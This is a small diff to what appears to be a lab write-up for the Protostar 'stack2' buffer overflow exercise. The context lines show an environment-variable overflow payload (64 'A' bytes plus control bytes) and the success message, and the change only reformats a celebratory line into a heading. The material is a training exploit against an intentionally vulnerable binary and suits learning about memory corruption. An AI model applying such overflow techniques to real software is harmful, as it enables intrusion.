@@ -54,5 +54,5 @@ export GREENIE=$(python -c 'print 64*"A" + "\x0a\x0d\x0a\x0d"')
 ./stack2
 you have correctly modified the variable
 ```
-BOOOOM GOT IT :D
+# BOOOOM GOT IT :D
 
